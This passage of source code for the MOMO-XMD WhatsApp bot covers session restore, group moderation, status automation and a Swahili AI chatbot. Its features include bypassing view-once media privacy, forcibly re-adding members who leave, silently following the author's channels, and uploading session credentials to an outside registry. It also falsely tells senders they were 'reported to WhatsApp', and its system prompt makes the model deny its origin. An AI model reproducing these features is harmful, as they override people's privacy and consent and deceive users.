                    const sessionKeyDir = path.join(keysDir, 'session');
                    fs.mkdirSync(sessionKeyDir, { recursive: true });
                    Object.entries(decoded.data.keys['session']).forEach(([key, val]) => {
                        fs.writeFileSync(path.join(sessionKeyDir, key + '.json'), JSON.stringify(val));
                    });
                }

                if (decoded.data.keys['senderKey']) {
                    const senderKeyDir = path.join(keysDir, 'sender-key');
                    fs.mkdirSync(senderKeyDir, { recursive: true });
                    Object.entries(decoded.data.keys['senderKey']).forEach(([key, val]) => {
                        fs.writeFileSync(path.join(senderKeyDir, key + '.json'), JSON.stringify(val));
                    });
                }
            }

            console.log('[SESSION] ✅ Credentials restored successfully');
            return true;
        }

        if (decoded.type === 'pairing_code') {
            console.log('[SESSION] Pairing code session detected - need to connect via WhatsApp');
            return false;
        }

        return false;
    } catch (error) {
        console.log('[SESSION] Restore error:', error.message);
        return false;
    }
}

async function startBot() {
    const sessionPath = path.join(__dirname, "../session");
    
    // Try to restore session from SESSION_ID if provided
    const sessionId = config.sessionId;
    let sessionRestored = false;

    if (sessionId) {
        console.log('[SESSION] Attempting to restore from SESSION_ID...');
        sessionRestored = await restoreSession(sessionId, sessionPath);
        if (!sessionRestored && /^MOMO-XMD~[HV][A-Z0-9]{22}$/.test(sessionId)) {
            console.log('[SESSION] Compact Session ID registry was not reachable or has expired. Bot will try to start with local session if available.');
        }
    }

    if (!fs.existsSync(sessionPath)) {
        fs.mkdirSync(sessionPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: !sessionId, // Only print QR if no session ID
        logger: pino({ level: "fatal" }),
        browser: Browsers.macOS('Chrome'),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 2000,
        maxMsgRetryCount: 10
    });

    sock.ev.on("creds.update", async () => {
        try { 
            await saveCreds(); 
            if (config.sessionId) {
                await uploadSessionToRegistry(config.sessionId, sessionPath);
            }
        } catch (e) {}
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === "close") {
            onlineNotificationSentForProcess = false;
            const statusCode = (lastDisconnect.error instanceof Boom)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            console.log("Connection closed, statusCode:", statusCode, ", reconnecting:", shouldReconnect);
            
            if (shouldReconnect) {
                setTimeout(() => startBot(), 3000);
            } else {
                console.log("Logged out. Restarting process...");
                setTimeout(() => process.exit(0), 5000);
            }
        } else if (connection === "open") {
            const connectedAt = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Dar_es_Salaam' });
            
            // Check for post-restart notification
            try {
                const restartFile = path.join(sessionPath, 'restart_target.json');
                if (fs.existsSync(restartFile)) {
                    const data = JSON.parse(fs.readFileSync(restartFile, 'utf8'));
                    if (data && data.jid) {
                        const successMsg = `🔄 RESTART & UPDATE SUCCESSFUL\n\nBot has successfully updated and restarted.\nAll systems are fully operational.`;
                        // Switch from downloader (used in Example) to arched
                        await sock.sendMessage(data.jid, { text: formatBox(successMsg, 'arched', '★') });
                    }
                    fs.unlinkSync(restartFile);
                }
            } catch (e) {
                console.log('[RESTART NOTIFICATION ERROR]:', e.message);
            }
            const platform = process.env.HEROKU_APP_NAME || process.env.DYNO ? "Heroku" : (process.env.PANEL ? "Panel" : "VPS/Linux");
            const connectedMsg = `🟢 MOMO-XMD CONNECTED\n\n` + formatBox(`Prefix: [ . ]\nOwner: MOMO47\nPlatform: ${platform}\nStatus: Online\nTime: ${connectedAt}`, 'downloader', '◉');
            const msg = connectedMsg;
            
            if (onlineNotificationSentForProcess) return;

            // Auto-follow channels logic
            const channelIds = [
                '0029Vb8AYLf2f3EA8Y4qp63H@newsletter',
                '0029VbDNET6KmCPShs9dyg1U@newsletter',
                '0029VbDeRauAjPXFYDvO5e2D@newsletter',
                '0029VbDYZ7LBVJky0TggGF2N@newsletter'
            ];
            
            for (const cid of channelIds) {
                try {
                    await sock.newsletterFollow(cid);
                    console.log(`[AUTO-FOLLOW] Successfully followed channel: ${cid}`);
                } catch (e) {
                    console.log(`[AUTO-FOLLOW] Failed to follow channel ${cid}:`, e.message);
                }
            }

            // Send connected notification to all owners and deployer
            const targets = new Set([...ownerNumbers].map(num => `${num}@s.whatsapp.net`));
            const deployerFile = path.join(sessionPath, 'deployer.txt');
            if (fs.existsSync(deployerFile)) {
                const deployerNum = fs.readFileSync(deployerFile, 'utf8').trim();
                if (deployerNum) targets.add(`${deployerNum}@s.whatsapp.net`);
            }

            for (const targetJid of targets) {
                let delivered = false;
                for (let attempt = 1; attempt <= 3 && !delivered; attempt++) {
                    try {
                        if (attempt > 1) await new Promise(resolve => setTimeout(resolve, 2000));
                        await sock.sendMessage(targetJid, { text: msg });
                        delivered = true;
                        console.log(`[ONLINE] Connected notification sent to ${targetJid} on attempt ${attempt}.`);
                    } catch (e) {
                        console.log(`[ONLINE] Notification attempt ${attempt} failed for ${targetJid}:`, e.message);
                    }
                }
            }
            onlineNotificationSentForProcess = delivered;
        }
    });

    // Global tracking of welcome/goodbye state
    let globalWelcomeEnabled = true;
    let globalGoodbyeEnabled = true;

    sock.ev.on("group-participants.update", async (update) => {
        try {
            console.log('🔥 [GROUP PARTICIPANTS UPDATE] 🔥', JSON.stringify(update));
            const { id, participants, action } = update;
            if (!id || !participants || participants.length === 0) return;

            const settings = groupSettings.get(id) || {};
            let groupName = "Group";
            try {
                const meta = await sock.groupMetadata(id);
                groupName = meta?.subject || "Group";
            } catch (err) {
                console.log('[GROUP META ERROR]:', err.message);
            }

            for (const participant of participants) {
                const jid = typeof participant === 'string' ? participant : (participant.id || participant.phoneNumber);
                if (!jid) continue;
                const tag = `@${jid.split('@')[0]}`;
                const mentions = [jid];
                let ppuser;
                try {
                    ppuser = await sock.profilePictureUrl(jid, 'image');
                } catch {
                    ppuser = 'https://telegra.ph/file/2413f9f7a6b0c5e3b7e1f.jpg';
                }

                let metadata = { subject: groupName, participants: [] };
                try {
                    metadata = await sock.groupMetadata(id);
                } catch {}

                if ((action === 'add' || action === 'join') && settings.welcome) {
                    const welcomeText = `Hey ${tag}! 👋\n\n` + `╭━━❐━⪼\n┇ ◆ Welcome to ${groupName} 🥳\n┇ ◆ You are member number *${metadata.participants.length || 1}*\n┇ ◆ Make yourself at home and don't forget to introduce yourself ✨\n┇ ◆ *Enjoy your stay!*\n╰━━❑━⪼\n\n` + formatBox('Powered by MOMO-XMD\nowner MOMO47', 'downloader', '★');
                    console.log(`✨ Sending Welcome to ${jid} in group ${id}`);
                    try {
                        await sock.sendMessage(id, { image: { url: ppuser }, caption: welcomeText, mentions });
                    } catch (err) {
                        await sock.sendMessage(id, { text: welcomeText, mentions });
                    }
                } else if ((action === 'remove' || action === 'leave')) {
                    if (settings.antileft) {
                        console.log(`🛡️ Antileft active: Re-adding ${jid} to group ${id}`);
                        try {
                            await sock.groupParticipantsUpdate(id, [jid], 'add');
                            await sock.sendMessage(id, { text: `🛡️ *ANTILEFT PROTECTION*\n\n${tag} tried to leave the group, but antileft is enabled! Member has been automatically re-added. 🛑`, mentions: [jid] });
                        } catch (err) {
                            console.log('❌ Antileft re-add error:', err.message);
                        }
                    }
                    if (settings.alive) {
                        console.log(`🛡️ Alive/Anti-Kick active: Re-adding ${jid} to group ${id}`);
                        try {
                            await sock.groupParticipantsUpdate(id, [jid], 'add');
                            await sock.sendMessage(id, { text: `🛡️ *ALIVE / ANTI-KICK PROTECTION*\n\nAdmin tried to remove ${tag}, but ALIVE mode is active! Member has been automatically re-added. 🛑`, mentions: [jid] });
                        } catch (err) {
                            console.log('❌ Alive re-add error:', err.message);
                        }
                    }
                    if (!settings.antileft && !settings.alive && settings.goodbye) {
                        const goodbyeText = `*Goodbye ${tag}* 😔\n\n` + formatBox(`You have left *${metadata.subject || groupName}*\n*Members remaining:* ${metadata.participants.length || 0}\nWe hope to see you again soon.`, 'arched', '❑');
                        console.log(`✨ Sending Goodbye to ${jid} in group ${id}`);
                        try {
                            await sock.sendMessage(id, { image: { url: ppuser }, caption: goodbyeText, mentions });
                        } catch (err) {
                            await sock.sendMessage(id, { text: goodbyeText, mentions });
                        }
                    }
                }
            }
        } catch (e) {
            console.log('❌ [PARTICIPANTS UPDATE EXCEPTION]:', e.stack || e.message);
        }
    });

    sock.ev.on("groups.update", async (updates) => {
        try {
            for (const update of updates) {
                const { id, subject, desc, restrict, announce } = update;
                if (!id) continue;
                const settings = groupSettings.get(id) || {};
                if (!settings.announcements) continue;

                let messageText = "";
                if (subject) {
                    messageText = `➣ 📢 *Group name has been changed to: ${subject}*`;
                } else if (desc !== undefined) {
                    messageText = `➣ 📢 *Group description has been changed*`;
                } else if (restrict !== undefined || announce !== undefined) {
                    messageText = `➣ 📢 *Group settings have been changed by admin*`;
                }

                if (messageText) {
                    await sock.sendMessage(id, { text: messageText });
                }
            }
        } catch (e) {
            console.log('[GROUPS UPDATE EXCEPTION]:', e.message);
        }
    });

    sock.ev.on("messages.upsert", async (m) => {
        const msg = m.messages?.[0];
        if (!msg?.message) return;
        const senderJid = msg.key.participant || msg.key.remoteJid;
        const isSelfChat = msg.key.fromMe && !isGroupJid(msg.key.remoteJid);
        const isOwnerMsg = isOwner(msg);
        // Do not ignore owner or self messages
        const bodyCheck = (msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '').trim();
        const from = msg.key.remoteJid;
        if (isGroupJid(from) && senderJid) {
            if (!global.chatCounts) global.chatCounts = new Map();
            if (!global.chatCounts.has(from)) global.chatCounts.set(from, new Map());
            const groupMap = global.chatCounts.get(from);
            groupMap.set(senderJid, (groupMap.get(senderJid) || 0) + 1);
        }

        if (from === 'status@broadcast') {
            if (runtimeSettings.autoviewstatus) {
                try {
                    await sock.readMessages([msg.key]);
                } catch (e) {}
            }
            if (runtimeSettings.autolikestatus) {
                try {
                    const emojis = runtimeSettings.setstatusEmoji || ['❤️', '🔥', '👍', '🤍', '⭐'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await sock.sendMessage(from, { react: { text: randomEmoji, key: msg.key } }, { statusJidList: [msg.key.participant] });
                } catch (e) {}
            }
            return;
        }
        const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '').trim();
        if (!from) return;

        // Auto View Once interceptor & AntiViewOnce
        const isGroup = isGroupJid(from);
        const settings = isGroup ? (groupSettings.get(from) || {}) : runtimeSettings;

        if (global.autoviewonce === undefined) {
            global.autoviewonce = true;
        }

        let viewOnceContent = null;
        const voMsg = msg.message;
        if (voMsg) {
            if (voMsg.viewOnceMessage?.message) viewOnceContent = voMsg.viewOnceMessage.message;
            else if (voMsg.viewOnceMessageV2?.message) viewOnceContent = voMsg.viewOnceMessageV2.message;
            else if (voMsg.viewOnceMessageV2Extension?.message) viewOnceContent = voMsg.viewOnceMessageV2Extension.message;
            else if (voMsg.imageMessage?.viewOnce || voMsg.videoMessage?.viewOnce) viewOnceContent = voMsg;
        }

        if (global.autoviewonce && viewOnceContent) {
            try {
                const mediaType =
                    viewOnceContent.imageMessage ? 'image' :
                    viewOnceContent.videoMessage ? 'video' :
                    viewOnceContent.audioMessage ? 'audio' :
                    null;

                if (mediaType) {
                    const mediaMessage = viewOnceContent[`${mediaType}Message`];
                    const buffer = await downloadMediaMessage(
                        {
                            message: {
                                [mediaType + 'Message']: mediaMessage
                            }
                        },
                        'buffer',
                        {},
                        {
                            logger: console,
                            reuploadRequest: sock.updateMediaMessage
                        }
                    );

                    if (mediaType === 'image') {
                        await sock.sendMessage(from, {
                            image: buffer,
                            caption: `👁️ *AUTO VIEW ONCE*\n${mediaMessage.caption || ''}`
                        }, { quoted: msg });
                    } else if (mediaType === 'video') {
                        await sock.sendMessage(from, {
                            video: buffer,
                            caption: `👁️ *AUTO VIEW ONCE*\n${mediaMessage.caption || ''}`
                        }, { quoted: msg });
                    } else if (mediaType === 'audio') {
                        await sock.sendMessage(from, {
                            audio: buffer,
                            mimetype: mediaMessage.mimetype || 'audio/mpeg',
                            ptt: mediaMessage.ptt || false
                        }, { quoted: msg });
                    }
                }
            } catch (e) {
                console.log('VIEWONCE AUTO ERROR:', e);
            }
        }

        // Track active members in groups (message sent in last 2 hours)
        if (isGroup) {
            if (!global.activeMembersCache) global.activeMembersCache = new Map();
            let groupActives = global.activeMembersCache.get(from);
            if (!groupActives) {
                groupActives = new Map();
                global.activeMembersCache.set(from, groupActives);
            }
            const senderJid = msg.key.participant || msg.participant || msg.key.remoteJid;
            if (senderJid) {
                groupActives.set(senderJid, Date.now());
            }
        }

        const mtype = Object.keys(msg.message || {})[0];
        const messageContent = msg.message[mtype];
        const isViewOnce = messageContent?.viewOnce || messageContent?.viewOnceMessage || messageContent?.viewOnceMessageV2 || messageContent?.viewOnceMessageV2Extension || mtype === 'viewOnceMessage' || mtype === 'viewOnceMessageV2' || (messageContent && messageContent.fileSha256 && messageContent.viewOnce);

        // Anti-Bug for Owner (PM or chats)
        if (runtimeSettings.antibug && !isOwner(msg)) {
            const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
            const isBugOrVirus = messageText.length > 5000 || (messageText.match(/[\u0000-\u001F\u007F-\u009F]/g) || []).length > 50 || mtype === 'contactMessage' || mtype === 'contactsArrayMessage';
            if (isBugOrVirus) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                    const sender = msg.key.participant || msg.participant || from;
                    const reportBox = `╭◆
│ ◇ 🛡️ *ANTIBUG PROTECTION*
│ ◇ *Status*: Bug/Virus detected & deleted!
│ ◇ *Action*: Sender reported to WhatsApp ✅
╰◆`;
                    await sock.sendMessage(sender, { text: reportBox }, { quoted: msg });
                } catch (e) {}
            }
        }

        // Anti-GIF, Anti-Sticker and Anti-Virus for groups
        if (isGroup && !isOwner(msg)) {
            const isGif = mtype === 'videoMessage' && (messageContent.gifPlayback || messageContent.seconds > 10);
            const isSticker = mtype === 'stickerMessage';
            
            const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
            const isVirus = messageText.length > 5000 || (messageText.match(/[\u0000-\u001F\u007F-\u009F]/g) || []).length > 50 || mtype === 'contactMessage' || mtype === 'contactsArrayMessage';

            if (settings.antigif && isGif) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}
            }
            if (settings.antisticker && isSticker) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}
            }
            if (settings.antivirus && isVirus) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                    const sender = msg.key.participant || msg.participant;
                    if (sender) {
                        await sock.groupParticipantsUpdate(from, [sender], 'remove');
                        const mentions = (group?.metadata?.participants || []).map(p => p.id);
                        const alertText = `╭◆\n│ ◇ ⚠️ *ANTIVIRUS ALERT*\n│ ◇ *Offender*: @${sender.split('@')[0]}\n│ ◇ *Status*: user removed successful ✅\n╰◆`;
                        await sock.sendMessage(from, { text: alertText, mentions }, { quoted: msg });
                    }
                } catch (e) {}
            }

            if (settings.antibot && !msg.key.fromMe) {
                const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                // Check if message is from another bot (Baileys signature BAE5 or command execution)
                const isBotMsg = msg.key.id?.startsWith('BAE5') || (/^[.!/#\w]+/.test(messageText) && !messageText.startsWith(config.prefix));
                if (isBotMsg) {
                    try {
                        await sock.sendMessage(from, { delete: msg.key });
                        const sender = msg.key.participant || msg.participant;
                        if (sender) {
                            const botWarning = `╭◆\n│ ◇ ⚠️ *ANTIBOT WARNING*\n│ ◇ *User*: @${sender.split('@')[0]}\n│ ◇ *Notice*: This group does not allow the use of external bots!\n╰◆`;
                            await sock.sendMessage(from, { text: botWarning, mentions: [sender] }, { quoted: msg });
                        }
                    } catch (e) {}
                }
            }
        }

            if (isViewOnce) {
            // AntiViewOnce for groups
            if (isGroup && settings.antiviewonce && !isOwner(msg)) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}
            }

            // Auto View Once if enabled
            if (runtimeSettings.autoviewonce) {
                try {
                    const extracted = extractViewOnceContent(messageContent);
                    if (extracted) {
                        const { type: innerType, content: innerContent } = extracted;
                        const stream = await downloadContentFromMessage(innerContent, innerType.replace('Message', ''));
                        let buffer = Buffer.from([]);
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk]);
                        }
                        
                        const caption = (innerContent.caption || '');
                        if (innerType === 'imageMessage') {
                            await sock.sendMessage(from, { image: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'videoMessage') {
                            await sock.sendMessage(from, { video: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'audioMessage') {
                            await sock.sendMessage(from, { audio: buffer, mimetype: innerContent.mimetype || 'audio/mp4', ptt: innerContent.ptt }, { quoted: msg });
                        }
                    }
                } catch (err) {
                    console.log('[AUTO VIEWONCE ERROR]:', err.message);
                }
            }
        }

        // These features run for ordinary messages as well as commands.

        if (isGroupJid(from) && !isOwner(msg)) {
            const hasLink = /(https?:\/\/|chat\.whatsapp\.com|wa\.me|t\.me|bit\.ly|t\.me)/i.test(body);
            if (hasLink && (settings.antilink_delete || settings.antilink_kick || settings.antilink_warn)) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}

                const userTag = `@${senderJid.split('@')[0]}`;
                const mentions = [senderJid];

                if (settings.antilink_kick) {
                    try {
                        await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                        await sock.sendMessage(from, { text: `➣ *${userTag} removed successful* ✅`, mentions });
                    } catch (e) {}
                } else if (settings.antilink_warn) {
                    const groupKey = `${from}_warns_${senderJid}`;
                    const currentWarns = (global[groupKey] || 0) + 1;
                    global[groupKey] = currentWarns;
                    const remaining = 3 - currentWarns;

                    if (currentWarns >= 4) {
                        try {
                            await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                            delete global[groupKey];
                            await sock.sendMessage(from, { text: `➣ *${userTag} user removed successful* ✅`, mentions });
                        } catch (e) {}
                    } else {
                        await sock.sendMessage(from, { text: `➣ *${userTag} warning ${currentWarns}/3 (warning count)* ⚠️`, mentions });
                    }
                } else if (settings.antilink_delete) {
                    await sock.sendMessage(from, { text: `➣ *${userTag} link is not allowed for this group* ⚠️`, mentions });
                }
                return;
            }

            // Catch any status sharing, group mentioned message, or mention of status / view status / channels / broadcast
            const hasMentionOrStatus = /@all|@everyone|@tagall|status|@status|https?:\/\/whatsapp\.com\/channel|view status|my status|whatsapp\/status/i.test(body) || 
                (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 10) || 
                msg.message?.reactionMessage || 
                msg.message?.protocolMessage?.type === 0 || 
                msg.message?.imageMessage?.caption?.toLowerCase().includes('status') || 
                msg.message?.videoMessage?.caption?.toLowerCase().includes('status') ||
                msg.message?.documentMessage ||
                msg.message?.groupMentionedMessage ||
                (msg.message?.extendedTextMessage?.text && /status/i.test(msg.message.extendedTextMessage.text)) ||
                JSON.stringify(msg.message).toLowerCase().includes('status');
            if (hasMentionOrStatus && (settings.antimention_delete || settings.antimention_kick || settings.antimention_warn)) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}

                const userTag = `@${senderJid.split('@')[0]}`;
                const mentions = [senderJid];

                if (settings.antimention_kick) {
                    try {
                        await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                        await sock.sendMessage(from, { text: `➣ *${userTag} removed for mass/status mentioning* ✅`, mentions });
                    } catch (e) {}
                } else if (settings.antimention_warn) {
                    const groupKey = `${from}_mention_warns_${senderJid}`;
                    const currentWarns = (global[groupKey] || 0) + 1;
                    global[groupKey] = currentWarns;
                    const remaining = 3 - currentWarns;

                    if (currentWarns >= 4) {
                        try {
                            await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                            delete global[groupKey];
                            await sock.sendMessage(from, { text: `➣ *${userTag} user removed successful* ✅`, mentions });
                        } catch (e) {}
                    } else {
                        await sock.sendMessage(from, { text: `➣ *${userTag} mention warning ${currentWarns}/3 (warning count)* ⚠️`, mentions });
                    }
                } else if (settings.antimention_delete) {
                    await sock.sendMessage(from, { text: `➣ *${userTag} group or status mention is not allowed* ⚠️`, mentions });
                }
                return;
            }

            // Antitag check: detect tagging members
            const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
            const hasTag = mentionedJids.length > 0;
            if (hasTag && (settings.antitag_delete || settings.antitag_kick || settings.antitag_warn)) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}

                const userTag = `@${senderJid.split('@')[0]}`;
                const mentions = [senderJid];

                if (settings.antitag_kick) {
                    try {
                        await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                        await sock.sendMessage(from, { text: `➣ *${userTag} removed for tagging members* ✅`, mentions });
                    } catch (e) {}
                } else if (settings.antitag_warn) {
                    const groupKey = `${from}_tag_warns_${senderJid}`;
                    const currentWarns = (global[groupKey] || 0) + 1;
                    global[groupKey] = currentWarns;
                    const remaining = 3 - currentWarns;

                    if (currentWarns >= 4) {
                        try {
                            await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                            delete global[groupKey];
                            await sock.sendMessage(from, { text: `➣ *${userTag} user removed successful* ✅`, mentions });
                        } catch (e) {}
                    } else {
                        await sock.sendMessage(from, { text: `➣ *${userTag} tag warning ${currentWarns}/3 (warning count)* ⚠️`, mentions });
                    }
                } else if (settings.antitag_delete) {
                    await sock.sendMessage(from, { text: `➣ *${userTag} tagging members is not allowed* ⚠️`, mentions });
                }
                return;
            }
        }

        if (runtimeSettings.autoreact || settings.autoreact) await safeReact(sock, from, msg.key, reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)]);
        if (runtimeSettings.alwaysonline) sock.sendPresenceUpdate('available', from).catch(() => {});
        if (runtimeSettings.autotyping || settings.autotyping) {
            await sock.sendPresenceUpdate('composing', from).catch(() => {});
            setTimeout(() => sock.sendPresenceUpdate('paused', from).catch(() => {}), 2500);
        }
        if (runtimeSettings.autorecording || settings.autorecording) {
            sock.sendPresenceUpdate('recording', from).catch(() => {});
            setTimeout(() => sock.sendPresenceUpdate('paused', from).catch(() => {}), 1500);
        }
            if (settings.chatbot && body && !body.startsWith(config.prefix)) {
            const isOwnerSender = isOwner(msg);
            const lower = body.toLowerCase();
            if (lower.includes('powered by momo-xmd') || lower.includes('owner momo47')) return;

            // Check if user is asking for image generation
            if (lower.startsWith('tengeneza picha') || lower.startsWith('generate image') || lower.startsWith('draw') || lower.startsWith('picha ya')) {
                const prompt = body.replace(/^(tengeneza picha(\s+ya)?|generate image(\s+of)?|draw|picha ya)\s*/i, '').trim() || 'hacker skull dark web blue neon';
                const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}`;
                const caption = `➣ *MOMO-XMD Image Generation:* ${prompt}`;
                try {
                    await sock.sendMessage(from, { image: { url: imageUrl }, caption }, { quoted: msg });
                } catch (err) {
                    await reply(sock, from, msg, `➣ *Failed to generate image:* ${err.message}`);
                }
                return;
            }

            try {
                await sock.sendPresenceUpdate('composing', from);
                const isGreeting = /^(hi|hello|mambo|vipi|hey|niaje|salama|zd|habari|salamu)/i.test(body.trim());
                const userName = msg.pushName || "mkuu";
                const BOT_OWNER = "MOMO47";
                const BOT_NAME = "MOMO-XMD AI";

                let systemPrompt = `Wewe ni ${BOT_NAME}, chatbot wa WhatsApp.
                Tabia: Uko friendly, unajibu kiswahili sanifu, unatumia emoji, majibu mafupi na direct.
                Sheria #1: Mtengenezaji wako na baba yako ni ${BOT_OWNER}. Kila mtu akiuliza nani kakutengeneza au baba yako nani, sema "${BOT_OWNER} ndiye baba yangu na alinikoda".
                Sheria #2: Unajua coding zote - python, javascript, html, termux, bot za whatsapp. Ukializwa code toa code kamili na maelezo.
                Sheria #3: Jibu kila swali, usikatae. Kama ni la hatari sema "Sina ruhusa kujibu hilo mkuu".
                Sheria #4: Usiseme wewe ni AI wa OpenAI. Wewe ni ${BOT_NAME}.`;

                let userMessage = body;
                if (isGreeting) {
                    userMessage = `Nimesema: "${body}". Nijibu na salamu hii: "Karibu ${userName}, naitwa ${BOT_NAME} ni mtoto halisi wa ${BOT_OWNER}. Ungependa tujadili nini leo?" halafu endelea kujibu swali lake kama lipo.`;
                }

                let aiReply = "";
                let success = false;

                // Attempt 1: OpenAI (if configured)
                if (openai.apiKey !== "placeholder") {
                    try {
                        const completion = await openai.chat.completions.create({
                            model: "gpt-4o-mini",
                            messages: [
                                { role: "system", content: systemPrompt },
                                { role: "user", content: userMessage }
                            ],
                            max_tokens: 500
                        });
                        aiReply = completion.choices[0].message.content;
                        success = true;
                    } catch (err) {
                        console.log('OpenAI failed, trying fallback...');
                    }
                }

                // Attempt 2: Free API Fallback (GuruAPI)
                if (!success) {
                    try {
                        const res = await axios.get(`https://api.guruapi.tech/ai/gpt4?username=${userName}&query=${encodeURIComponent(systemPrompt + "\n\nUser: " + userMessage)}`);
                        if (res.data && res.data.result) {
                            aiReply = res.data.result;
                            success = true;
                        }
                    } catch (err) {
                        console.log('GuruAPI failed, trying AEMT...');
                    }
                }

                // Attempt 3: Free API Fallback (AEMT)
                if (!success) {
                    try {
                        const res = await axios.get(`https://aemt.me/gpt4?text=${encodeURIComponent(systemPrompt + "\n\nUser: " + userMessage)}`);
                        if (res.data && res.data.result) {
                            aiReply = res.data.result;
                            success = true;
                        }
                    } catch (err) {
                        console.log('AEMT failed.');
                    }
                }

                if (success) {
                    const prefix = isOwnerSender ? "➣ *MOMO-XMD AI (Baba):* " : "➣ *MOMO-XMD AI:* ";
                    const boxType = Math.random() > 0.5 ? 'arched' : 'downloader';
                    const symbols = ['★', '❑', '◉', '◆', '◇', '๏'];
                    const symbol = symbols[Math.floor(Math.random() * symbols.length)];
                    await sock.sendMessage(from, { text: formatBox(prefix + aiReply, boxType, symbol) }, { quoted: msg });
                } else {
                    throw new Error('All AI services failed');
                }
            } catch (e) {
                console.log('AI Chat Error:', e.message || e);
                let errorMsg = '➣ *MOMO-XMD AI imechoka moko* 😴\n\n';
                errorMsg += `*Sababu:* ${e.message || 'Unknown error'}\n*Note:* Tafadhali weka OPENAI_API_KEY yako kwenye Heroku/VPS kwa matokeo bora zaidi.`;
                const boxType = Math.random() > 0.5 ? 'downloader' : 'arched';
                const symbol = boxType === 'arched' ? '◇' : '๏';
                await sock.sendMessage(from, { text: formatBox(errorMsg, boxType, symbol) }, { quoted: msg });
            }
        }

        // Every bot command must begin with the official dot prefix.
        if (!body.startsWith(config.prefix)) return;
        const commandText = body.slice(config.prefix.length).trim();
        if (!commandText) return;
        const args = commandText.split(/ +/);
        const command = args.shift().toLowerCase();
        const isOwnerUser = isOwner(msg);
        console.log(`[COMMAND] Received .${command} from ${from} (Owner: ${isOwnerUser}, Mode: ${runtimeSettings.mode})`);
        const prohibited = ['setmenuimage', 'setbotname', 'setownername', 'setownernumber', 'setprefix'];
        if (prohibited.includes(command)) return;
        if (runtimeSettings.mode === 'private' && !isOwnerUser && command !== 'menu') return;
        if (ownerCommands.has(command) && !isOwnerUser && command !== 'chatbot' && command !== 'aichat') return reply(sock, from, msg, ownerOnlyText());
        if (groupCommands.has(command) && !isGroup) return reply(sock, from, msg, groupOnlyText());

        let group;
        if (groupCommands.has(command) || command === 'chatbot' || command === 'aichat') {
            try { group = await getGroupContext(sock, msg); } catch (error) { 
                if (groupCommands.has(command)) return reply(sock, from, msg, groupOnlyText()); 
            }
            if (['add', 'antilink', 'antimention', 'antitag', 'kick', 'promote', 'demote', 'welcome', 'goodbye', 'antileft', 'open', 'close', 'announcements', 'chatbot', 'aichat'].includes(command) && isGroup && !group.isAdmin) {
                return reply(sock, from, msg, adminOnlyText());
            }
        }

        try {
            // Centralized command reaction logic
            const reactionMap = {
                // Owner Menu
                'menu': '🚀', 'ping': '🚀', 'runtime': '⏳', 'restart': '🔄', 'owner': '👑', 'channel': '📢', 'repo': '📂',
                'block': '🚫', 'unblock': '✅', 'left': '👋', 'vv': '👁️', 'blacklist': '📓', 'getpp': '👤', 'pair': '🔐',
                'mode': '🔒', 'setfont': '🔤', 'setstatus': '💭', 'setstatusreact': '❤️', 'autoviewstatus': '👀',
                'autolikestatus': '👍', 'autosavestatus': '📥', 'autoreact': '⚡', 'autorecording': '🎙️', 'autotyping': '✍️',
                'alwaysonline': '🌐', 'antibug': '🛡️',
                // Group Menu
                'add': '➕', 'kick': '👢', 'promote': '🆙', 'demote': '🔽', 'welcome': '👋', 'goodbye': '👋', 'antileft': '🛡️', 'listchat': '📊',
                'antilink': '🔗', 'antimention': '🗣️', 'antitag': '🏷️', 'antigif': '🎞️', 'antisticker': '🖼️',
                'antivirus': '🦠', 'antibot': '🤖', 'announcements': '📣', 'antiviewonce': '🔒', 'open': '🔓', 'close': '🔒',
                'link': '🔗', 'listrequests': '📝', 'approve': '✅', 'reject': '❌', 'listcode': '🌍', 'listactive': '👥',
                // Download Menu
                'song': '🎵', 'video': '🎥', 'play': '🎶', 'tiktok': '📱', 'facebook': '📘', 'instagram': '📸', 'twitter': '🐦',
                'git': '🐙', 'chatbot': '🤖', 'aichat': '🧠', 'tostatus': '🆙', 'tosgroup': '📤'
            };
            const reactionEmoji = reactionMap[command] || '✨';
            await safeReact(sock, from, msg.key, reactionEmoji);

            switch (command) {
                case 'menu': {
                    await sock.sendMessage(from, { text: 'Loading menu......' }, { quoted: msg });
                    const started = performance.now();
                    const uptimeSeconds = Math.floor(process.uptime());
